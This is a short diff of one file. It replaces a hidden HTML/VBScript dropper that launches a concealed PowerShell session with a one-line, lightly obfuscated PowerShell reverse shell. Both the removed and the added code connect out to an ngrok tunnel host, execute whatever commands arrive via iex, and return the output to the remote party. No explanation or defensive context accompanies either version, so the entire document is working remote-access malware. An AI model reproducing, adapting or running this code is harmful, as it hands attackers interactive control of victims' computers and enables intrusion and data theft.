@@ -1,11 +1,1 @@
-<html>
-<head>
-<script language="VBScript">
-Set s = CreateObject("WScript.Shell")
-s.Run "powershell.exe -nop -win hidden -c ""$c=New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',15590);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([text.encoding]::ASCII).GetBytes($sb2),0,$sb2.Length)}""", 0
-self.close
-</script>
-</head>
-<body>
-</body>
-</html>
+Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io',15132));Set-Variable -Value ($client.GetStream()) -Name stream;[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Value ($stream.Read($bytes, 0, $bytes.Length)) -Name i) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Value (iex $data 2>&1 | Out-String ) -Name sendback;Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Value (([text.encoding]::ASCII).GetBytes($sendback2)) -Name sendbyte;$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
